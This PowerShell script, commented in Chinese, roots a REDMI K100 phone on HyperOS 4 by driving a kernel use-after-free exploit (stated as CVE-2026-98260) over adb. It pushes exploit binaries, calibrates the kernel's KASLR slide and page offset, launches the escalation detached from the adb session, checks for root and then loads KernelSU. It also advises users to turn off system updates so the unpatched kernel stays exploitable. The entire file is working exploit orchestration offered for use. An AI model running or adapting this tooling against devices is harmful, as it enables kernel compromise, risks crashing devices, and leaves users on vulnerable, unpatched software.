#Requires -Version 5.1
<#
  REDMI K100 (warsaw) HyperOS 4 一键 root
  利用 CVE-2026-98260 (exec/posix-cpu-timers UAF) 提权，并尝试 late-load KernelSU (LKM)。

  仅适用于内核 6.6.118-android15-8-g0908354dac1b-ab16143355-4k。
  偏移表是按该构建的 kallsyms 生成的；换构建必须重新生成，否则会 panic。
#>
[CmdletBinding()]
param(
    [string]$AdbPath,
    [switch]$SkipKsu,
    [switch]$CheckOnly,
    [switch]$Force
)

$ErrorActionPreference = 'Stop'

$script:Root   = Split-Path -Parent $MyInvocation.MyCommand.Path
$script:Bin    = Join-Path $script:Root 'bin'
$script:LogDir = Join-Path $script:Root 'log'
if (-not (Test-Path $script:LogDir)) { New-Item -ItemType Directory -Force $script:LogDir | Out-Null }
$script:LogFile = Join-Path $script:LogDir ('run-{0:yyyyMMdd-HHmmss}.log' -f (Get-Date))

$EXPECT_DEVICE = 'warsaw'
$EXPECT_KERNEL = '6.6.118-android15-8-g0908354dac1b-ab16143355-4k'
$REMOTE        = '/data/local/tmp'
$RHOME         = '/data/local/tmp/cvehome'

function Write-Log {
    param([string]$Message, [ValidateSet('INFO','STEP','OK','WARN','ERR')][string]$Level = 'INFO')
    $line = '[{0}] {1,-4} {2}' -f (Get-Date -Format 'HH:mm:ss'), $Level, $Message
    $color = switch ($Level) {
        'OK'   { 'Green' }
        'WARN' { 'Yellow' }
        'ERR'  { 'Red' }
        'STEP' { 'Cyan' }
        default { 'Gray' }
    }
    Write-Host $line -ForegroundColor $color
    Add-Content -LiteralPath $script:LogFile -Value $line -Encoding UTF8
}

function Resolve-Adb {
    $candidates = New-Object System.Collections.Generic.List[string]
    if ($AdbPath) { $candidates.Add($AdbPath) }
    $onPath = Get-Command adb -ErrorAction SilentlyContinue
    if ($onPath) { $candidates.Add($onPath.Source) }
    $candidates.Add('D:\SDKs\Android\platform-tools\adb.exe')
    $candidates.Add((Join-Path $env:LOCALAPPDATA 'Android\Sdk\platform-tools\adb.exe'))
    $candidates.Add('C:\Android\platform-tools\adb.exe')
    foreach ($c in $candidates) {
        if ($c -and (Test-Path -LiteralPath $c)) { return $c }
    }
    throw '找不到 adb.exe。请安装 platform-tools，或用 -AdbPath 指定路径。'
}

function Invoke-Adb {
    param(
        [Parameter(Mandatory = $true)][string[]]$AdbArgs,
        [switch]$AllowFail
    )
    $out  = & $script:Adb @AdbArgs 2>&1
    $code = $LASTEXITCODE
    $text = ($out | Out-String).Trim()
    if ($code -ne 0 -and -not $AllowFail) {
        throw ("adb {0} 失败 (exit {1})`n{2}" -f ($AdbArgs -join ' '), $code, $text)
    }
    return $text
}

function Wait-Device {
    Write-Log '等待设备（请确认已开 USB 调试并在手机上点“允许”）...' STEP
    for ($i = 0; $i -lt 30; $i++) {
        $raw = (& $script:Adb devices 2>&1 | Out-String)
        if ($raw -match 'unauthorized') {
            Write-Log '设备显示 unauthorized：请在手机弹窗中点“允许 USB 调试”。' WARN
        }
        if ($raw -match '(?m)^(\S+)\s+device\s*$') { return $Matches[1] }
        Start-Sleep -Seconds 2
    }
    throw '未检测到已授权的设备。请开启开发者选项 → USB 调试，并重新插拔数据线。'
}

function Get-Prop {
    param([string]$Name)
    return (Invoke-Adb -AdbArgs @('shell', "getprop $Name")).Trim()
}

function Assert-Preflight {
    Write-Log '阶段 0/5 环境检查' STEP

    $serial = Wait-Device
    Write-Log ("已连接设备: {0}" -f $serial) OK

    $device  = Get-Prop 'ro.product.device'
    $model   = Get-Prop 'ro.product.marketname'
    $build   = Get-Prop 'ro.build.version.incremental'
    $android = Get-Prop 'ro.build.version.release'
    $kernel  = (Invoke-Adb -AdbArgs @('shell', 'uname -r')).Trim()

    Write-Log ("机型={0} 代号={1} 版本={2} Android={3}" -f $model, $device, $build, $android)
    Write-Log ("内核={0}" -f $kernel)

    if ($device -ne $EXPECT_DEVICE -and -not $Force) {
        throw ("设备代号 {0} 与本脚本目标 {1} 不符。确认无误可加 -Force。" -f $device, $EXPECT_DEVICE)
    }
    if ($kernel -ne $EXPECT_KERNEL) {
        $msg = @(
            "内核版本不匹配，已中止。",
            ("  期望: {0}" -f $EXPECT_KERNEL),
            ("  实际: {0}" -f $kernel),
            '偏离一个构建号，符号地址就会整体偏移，强行注入只会 panic。',
            '如果系统升级过，本工具对该机已失效（新内核通常已修复该 CVE）。'
        ) -join "`n"
        if (-not $Force) { throw $msg }
        Write-Log $msg WARN
    }

    $missing = @()
    foreach ($f in @('cve98260', 'profile.bin')) {
        $p = Join-Path $script:Bin $f
        if (-not (Test-Path -LiteralPath $p)) { $missing += $f }
    }
    if (-not $SkipKsu -and -not (Test-Path -LiteralPath (Join-Path $script:Bin 'ksud'))) { $missing += 'ksud' }
    if ($missing.Count -gt 0) { throw ("bin 目录缺少文件: {0}" -f ($missing -join ', ')) }

    Write-Log '环境检查通过' OK
}

function Push-Payload {
    Write-Log '阶段 1/5 推送 payload' STEP

    # 清掉上一轮残留（陈旧 socket 会让 su 客户端连错 inode）
    [void](Invoke-Adb -AdbArgs @('shell', "rm -f $REMOTE/pc98260-root.sock $REMOTE/cve98260 $REMOTE/profile.bin $REMOTE/ksu_step.sh 2>/dev/null; mkdir -p $RHOME") -AllowFail)

    foreach ($f in @('cve98260', 'profile.bin')) {
        [void](Invoke-Adb -AdbArgs @('push', (Join-Path $script:Bin $f), "$REMOTE/$f"))
    }
    [void](Invoke-Adb -AdbArgs @('push', (Join-Path $script:Root 'run_exploit.sh'), "$REMOTE/run_exploit.sh"))
    if (-not $SkipKsu) {
        [void](Invoke-Adb -AdbArgs @('push', (Join-Path $script:Bin 'ksud'), "$REMOTE/ksud"))
        [void](Invoke-Adb -AdbArgs @('push', (Join-Path $script:Root 'ksu_step.sh'), "$REMOTE/ksu_step.sh"))
    }
    [void](Invoke-Adb -AdbArgs @('shell', "chmod 755 $REMOTE/cve98260 $REMOTE/run_exploit.sh $REMOTE/ksud $REMOTE/ksu_step.sh 2>/dev/null; ls -l $REMOTE/cve98260 $REMOTE/profile.bin"))

    Write-Log 'payload 已就位' OK
}

function Invoke-Calibration {
    Write-Log '阶段 2/5 KASLR / page_offset 校准' STEP
    Start-Sleep -Seconds 3

    $expectPageOffset = [Convert]::ToUInt64('ffffff7f80000000', 16)
    $slide = $null
    $pageOffset = $null

    # 校准会受开机后负载干扰：偶尔只能抓到计数极少的伪候选（slide 不对齐），
    # 用它去算内核地址会写错位置。因此这里校验两个硬指标并重试。
    for ($attempt = 1; $attempt -le 4; $attempt++) {
        $a = Invoke-Adb -AdbArgs @('shell', "cd $REMOTE && CVE98260_HOME=$RHOME ./cve98260 calibrate-a < profile.bin") -AllowFail
        if ($a -notmatch 'C98260_SLIDE=(0x[0-9a-fA-F]+)') {
            Write-Log ("第 {0} 次 calibrate-a 未取到 slide，重试" -f $attempt) WARN
            Start-Sleep -Seconds 5
            continue
        }
        $candidate = $Matches[1]
        $counts = @([regex]::Matches($a, 'count=(\d+)') | ForEach-Object { [int]$_.Groups[1].Value })
        $maxCount = 0
        if ($counts.Count -gt 0) { $maxCount = ($counts | Measure-Object -Maximum).Maximum }
        $aligned = (([Convert]::ToUInt64($candidate.Substring(2), 16)) % 0x200000) -eq 0

        if ((-not $aligned) -or ($maxCount -lt 64)) {
            Write-Log ("第 {0} 次校准不合格：slide={1} 对齐={2} 最大命中={3}，丢弃重试" -f $attempt, $candidate, $aligned, $maxCount) WARN
            Start-Sleep -Seconds 5
            continue
        }

        $b = Invoke-Adb -AdbArgs @('shell', "cd $REMOTE && CVE98260_HOME=$RHOME ./cve98260 calibrate-b < profile.bin") -AllowFail
        if ($b -notmatch 'C98260_PAGE_OFFSET=(0x[0-9a-fA-F]+)') {
            Write-Log ("第 {0} 次 calibrate-b 未取到 page_offset，重试" -f $attempt) WARN
            Start-Sleep -Seconds 5
            continue
        }
        $po = $Matches[1]
        if (([Convert]::ToUInt64($po.Substring(2), 16)) -ne $expectPageOffset) {
            Write-Log ("第 {0} 次 page_offset={1} 与 profile 期望 0xffffff7f80000000 不符，丢弃重试" -f $attempt, $po) WARN
            Start-Sleep -Seconds 5
            continue
        }

        $slide = $candidate
        $pageOffset = $po
        Write-Log ("KASLR slide = {0}（命中 {1} 次）" -f $slide, $maxCount) OK
        Write-Log ("page_offset = {0}" -f $pageOffset) OK
        break
    }

    if ((-not $slide) -or (-not $pageOffset)) {
        throw '校准连续 4 次失败（slide 未对齐 / 命中太少 / page_offset 与 profile 不符）。请重启手机后重试；若持续失败，多半是内核已被 OTA 更新。'
    }

    return [pscustomobject]@{ Slide = $slide; PageOffset = $pageOffset }
}

function Test-Rootd {
    $sock = Invoke-Adb -AdbArgs @('shell', "ls $REMOTE/pc98260-root.sock 2>/dev/null") -AllowFail
    if (-not $sock) { return $null }
    $id = Invoke-Adb -AdbArgs @('shell', "cd $REMOTE && ./cve98260 su -c id") -AllowFail
    if ($id -match 'uid=0\(root\)') { return $id.Trim() }
    return $null
}

function Invoke-Exploit {
    param([Parameter(Mandatory = $true)]$Calib)

    Write-Log '阶段 3/5 UAF 注入 + cred 提权（1~5 分钟）' STEP

    # 关键修复：adb shell 启动的进程本身就是 session leader（SID==PID==PGID），
    # exploit 里的 setsid() 会因 EPERM 失败，进程其实还挂在 adbd 会话下。
    # 拔数据线时 adbd 回收整个会话，park 住的进程被回收 -> 伪 cred 页提前释放
    # -> 内核 panic 重启。这里改用 /system/bin/setsid 显式派生新会话，
    # 再 nohup + 重定向 stdio，彻底与 adbd 解耦。
    $launch = 'cd {0} && nohup setsid ./run_exploit.sh {1} {2} >{3}/exploit.log 2>&1 </dev/null & sleep 1' -f $REMOTE, $Calib.Slide, $Calib.PageOffset, $RHOME
    [void](Invoke-Adb -AdbArgs @('shell', $launch) -AllowFail)

    # exploit 成功后主进程会 park 住、不会退出，所以轮询 rootd 而不是等进程结束。
    $deadline = (Get-Date).AddMinutes(12)
    $id = $null
    while ((Get-Date) -lt $deadline) {
        Start-Sleep -Seconds 3
        $id = Test-Rootd
        if ($id) { break }
    }

    # 会话脱离校验：setsid 之后主进程应被 init 收养（PPID=1）。
    $ps = Invoke-Adb -AdbArgs @('shell', "ps -A -o PID,SID,PPID,NAME 2>/dev/null | grep cve98260") -AllowFail
    if (-not $ps) { $ps = Invoke-Adb -AdbArgs @('shell', 'ps -A | grep cve98260') -AllowFail }
    if ($ps) {
        Write-Log ("注入进程会话：`n{0}" -f (($ps -split "`n" | Select-Object -First 6) -join "`n"))
        if ($ps -match '(?m)^\s*\d+\s+\d+\s+1\s') {
            Write-Log '主进程已脱离 adbd 会话（PPID=1），拔线安全' OK
        } else {
            Write-Log '警告：未确认会话脱离，拔线仍有 panic 风险' WARN
        }
    }

    $elog = Invoke-Adb -AdbArgs @('shell', "tail -n 12 $RHOME/exploit.log 2>/dev/null") -AllowFail
    if ($elog) { Write-Log ("注入日志末段：`n{0}" -f $elog) }

    if ($id) {
        Write-Log ("已获得临时 root: {0}" -f $id) OK
        return $true
    }
    Write-Log '未在超时内拿到 root' ERR
    return $false
}

function Invoke-Ksu {
    Write-Log '阶段 4/5 加载 KernelSU (LKM)' STEP

    $r = Invoke-Adb -AdbArgs @('shell', "cd $REMOTE && ./cve98260 su -c 'sh $REMOTE/ksu_step.sh'") -AllowFail
    Write-Log ("接管脚本输出：{0}" -f $r)

    Start-Sleep -Seconds 3

    $devices = (& $script:Adb devices 2>&1 | Out-String)
    if ($devices -notmatch '(?m)^\S+\s+device\s*$') {
        Write-Log '设备在 KSU 阶段断开（通常意味着内核 panic 并重启）' ERR
        return [pscustomobject]@{ ModuleLive = $false; Daemon = ''; SuOk = $false; DeviceLost = $true }
    }

    $mods = Invoke-Adb -AdbArgs @('shell', 'grep kernelsu /proc/modules 2>/dev/null') -AllowFail
    $live = $mods -match 'kernelsu'
    if ($live) { Write-Log ("模块已加载: {0}" -f $mods) OK } else { Write-Log '模块未出现在 /proc/modules' ERR }

    $daemon = Invoke-Adb -AdbArgs @('shell', 'pidof ksud 2>/dev/null') -AllowFail
    if ($daemon) { Write-Log ("ksud 守护进程 pid = {0}" -f $daemon) OK } else { Write-Log 'ksud 守护进程未运行' WARN }

    $su = Invoke-Adb -AdbArgs @('shell', 'su -c id 2>&1; /system/bin/su -c id 2>&1') -AllowFail
    $suOk = $su -match 'uid=0\(root\)'
    if ($suOk) { Write-Log ("su 可用: {0}" -f (($su -split "`n")[0])) OK } else { Write-Log 'su 尚不可用（可能被 SELinux 拦，或 ksud 未就绪）' WARN }

    return [pscustomobject]@{ ModuleLive = $live; Daemon = $daemon; SuOk = $suOk }
}

function Show-Summary {
    param($Rooted, $KsuResult)

    Write-Host ''
    Write-Host ('=' * 62)
    Write-Host ' 结果'
    Write-Host ('=' * 62)
    if ($Rooted) {
        Write-Host '  [√] 提权成功，临时 root 可用：' -ForegroundColor Green
        Write-Host '      adb shell "cd /data/local/tmp && ./cve98260 su -c id"'
    } else {
        Write-Host '  [×] 提权失败' -ForegroundColor Red
        Write-Host '      建议：重启手机后重跑本脚本（重启是唯一干净的清理方式）。'
    }

    if ($null -ne $KsuResult) {
        if ($KsuResult.ModuleLive) {
            Write-Host '  [√] KernelSU 模块已加载（LKM 模式）' -ForegroundColor Green
            if ($KsuResult.SuOk) { Write-Host '  [√] su 命令可用' -ForegroundColor Green }
            else { Write-Host '  [!] 模块已加载但 su 未就绪：打开 KernelSU 管理器查看状态' -ForegroundColor Yellow }
        } else {
            Write-Host '  [×] KernelSU 未加载' -ForegroundColor Red
        }
    }

    Write-Host ''
    Write-Host '  重要：' -ForegroundColor Yellow
    Write-Host '   · 临时 root 与 KSU 都只存在于内存，重启即失效，需重跑。'
    Write-Host '   · 出现异常请先重启，不要 kill /data/local/tmp/cve98260 进程。'
    Write-Host '   · 关闭系统自动更新，否则内核一旦升级到 6.6.158+ 本工具立即失效。'
    Write-Host ('=' * 62)
    Write-Host ("  日志: {0}" -f $script:LogFile)
}

# ---------------------------------------------------------------- main
try {
    Write-Host ''
    Write-Host ' REDMI K100 / HyperOS 4 / CVE-2026-98260 -> KernelSU' -ForegroundColor Cyan
    Write-Host (" 日志文件: {0}" -f $script:LogFile)
    Write-Host ''

    $script:Adb = Resolve-Adb
    Write-Log ("adb: {0}" -f $script:Adb)

    Assert-Preflight
    if ($CheckOnly) {
        Write-Log '仅检查模式，已通过。' OK
        exit 0
    }

    Push-Payload
    $calib = Invoke-Calibration
    $rooted = Invoke-Exploit -Calib $calib

    $ksuResult = $null
    if ($rooted -and -not $SkipKsu) {
        $ksuResult = Invoke-Ksu
    }

    Show-Summary -Rooted $rooted -KsuResult $ksuResult

    if (-not $rooted) { exit 3 }
    if (-not $SkipKsu -and -not $ksuResult.ModuleLive) { exit 4 }
    exit 0
}
catch {
    Write-Log ($_.Exception.Message) ERR
    Write-Host ''
    Write-Host ' 已中止。若手机出现异常，请长按电源键重启后再试。' -ForegroundColor Yellow
    Write-Host (" 日志: {0}" -f $script:LogFile)
    exit 1
}
